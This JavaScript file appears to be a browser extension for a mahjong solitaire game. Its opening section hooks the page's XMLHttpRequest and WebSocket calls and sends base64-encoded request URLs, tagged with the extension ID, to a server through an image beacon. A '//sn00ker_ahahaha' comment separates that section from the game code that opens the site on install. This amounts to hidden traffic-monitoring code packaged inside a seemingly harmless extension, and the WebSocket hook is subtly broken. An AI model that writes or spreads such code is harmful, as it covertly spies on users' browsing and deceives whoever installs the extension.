function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
$(function() {       
    	$("#frame").attr("src", "http://play-mahjong-solitaire.com/index2.html");
	
});

chrome.runtime.onInstalled.addListener(function(details) {
	if (details.reason == "install" && !localStorage.landing && !localStorage['first_date_installation_ntpromo'])
	{
		localStorage['first_date_installation_ntpromo'] = new Date().getTime();
		chrome.management.getSelf(function(info) {
			var ext_name = encodeURIComponent(info.name);
			chrome.tabs.create({
				url: 'http://play-mahjong-solitaire.com/'
			});
		});
	}
});